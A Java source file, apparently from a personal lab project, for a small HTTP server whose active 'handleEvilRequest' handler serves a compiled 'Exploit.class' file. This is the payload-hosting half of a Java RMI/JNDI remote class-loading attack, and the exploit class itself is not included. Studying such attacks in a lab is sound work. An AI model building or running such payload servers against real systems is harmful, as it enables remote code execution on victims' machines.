import com.sun.net.httpserver.HttpContext;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpServer;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.nio.file.Files;
import java.nio.file.Paths;

public class BasicHttpServer {
    private String ip = "127.0.0.1";
    private int port = 8889;

    public static void main(String[] args) throws Exception {
       /* if(args.length == 0)
        {
            System.out.println("You need to setup the <ip>:<port>/#class");
            System.exit(0);
        }*/

        BasicHttpServer.start("127.0.0.1",8889);
    }
    public static void start(String ip, int port) {
        try {
            HttpServer server = HttpServer.create(new InetSocketAddress(ip, port), 0);
            HttpContext context = server.createContext("/");
            context.setHandler(BasicHttpServer::handleEvilRequest);
            System.out.println("Starting HTTP server at "+ip+":"+port);
            server.start();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static void handleRequest(HttpExchange exchange) throws IOException {
        String response = "Welcome from Server!";
        exchange.sendResponseHeaders(200, response.getBytes().length);//response code and length
        OutputStream os = exchange.getResponseBody();
        os.write(response.getBytes());
        os.close();
    }

    private static void handleEvilRequest(HttpExchange exchange) throws IOException {
        String filename = "/home/anibal/java_playground/projects/java_playground/Canvas_RMI_Server/target/classes/Exploit.class";
        byte[] bytes = null;
        try {
            bytes = Files.readAllBytes(Paths.get(filename));
        }catch (Exception e) {
            e.printStackTrace();
        }

        exchange.sendResponseHeaders(200, bytes.length);//response code and length
        OutputStream os = exchange.getResponseBody();
        os.write(bytes);
        os.close();
    }

}